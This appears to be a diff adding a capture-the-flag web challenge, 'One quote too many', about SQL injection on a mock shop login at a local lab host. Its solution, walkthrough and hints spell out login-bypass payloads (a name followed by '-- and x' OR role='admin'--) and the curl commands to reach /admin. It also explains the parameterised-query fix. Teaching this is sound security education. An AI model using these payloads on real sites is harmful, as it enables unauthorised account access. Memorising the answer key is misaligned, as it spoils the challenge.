@@ -1,0 +1,71 @@
+title: One quote too many
+category: web
+level: Intermediate
+kind: Web
+topic: Injection
+teaser: the sign-in form glues what you type into a database question
+points: 65
+order: 2
+packages: httpd
+answer: flag
+var: STAFF = pick:margo|teodor|ingrid|oskar|lucia
+var: STAFFPW = hex:14
+var: WAY = pick:comment|or
+@vars WAY=comment
+PAYLOAD = {{STAFF}}'--
+@vars WAY=or
+PAYLOAD = x' OR role='admin'--
+
+@intro
+Copperleaf Market's sign-in page (http://copperleaf.example/login) checks your name
+and password by asking its database a question. The developer built that question
+by pasting your typing straight into it.
+
+The shop's owner signs in as {{STAFF}}. You don't know the password - and you may
+not need it. Sign in as staff, open /admin, and take the staff code. (Hint for the
+curious: try typing a single ' as your user name and read the error.)
+
+@setup
+systemctl enable --now httpd
+echo '127.0.0.1 copperleaf.example' >> /etc/hosts
+
+@web
+[ { "path": "/", "kind": "shop",
+    "settings": { "flag": "{{FLAG}}", "weak": "sqli-login", "me": "guest", "mypass": "guest",
+                  "accounts": "{{STAFF}}|{{STAFFPW}}|admin|{{STAFF}}@copperleaf.example;harper|pine{{STAFFPW}}|customer|harper@mail.example" } } ]
+
+@solution
+curl -s -d "user='&pass=x" http://copperleaf.example/login
+curl -s -d "user={{PAYLOAD}}&pass=x" http://copperleaf.example/login
+C=$(curl -s -d "user={{PAYLOAD}}&pass=x" http://copperleaf.example/login | grep -o 'session=[a-z0-9]*')
+curl -s -b "$C" http://copperleaf.example/admin
+
+@walkthrough
+A single quote as the user name breaks the page, and the error shows the question:
+
+    SELECT user, role FROM customers WHERE user = ''' AND pass = 'x'
+
+Your typing goes inside the quotes. So you can close the quote yourself and add
+your own words. -- starts a comment: everything after it is ignored, including the
+password check.
+{{if WAY=comment}}
+    user: {{STAFF}}'--     ->  WHERE user = '{{STAFF}}'-- ' AND pass = '...'
+{{else}}
+    user: x' OR role='admin'--   ->  WHERE user = 'x' OR role='admin'-- ...
+{{end}}
+    curl -s -d "user={{PAYLOAD}}&pass=x" http://copperleaf.example/login
+
+The database finds the staff row, the shop signs you in as staff, and /admin shows
+the code. This is SQL injection. The fix: never build a query from text - use
+parameterised queries, where the database is told "this part is data, not words of
+the question". (The shop's database here is a pretend one that understands only a
+tiny piece of the real language.)
+
+@hint 6
+Type a single ' (a quote) as the user name and read the error page carefully: it shows the exact question the shop asks its database, with your typing inside it.
+
+@hint 12
+Your text sits between two quotes. If your name ends with ' you close that quote early, and whatever comes next is read as part of the question. Two dashes -- tell the database "the rest of this line is a comment".
+
+@hint 20
+Sign in with the user name {{STAFF}}'-- and any password: the database then only checks the name. Keep the session cookie from the answer and open /admin with it (curl -b).
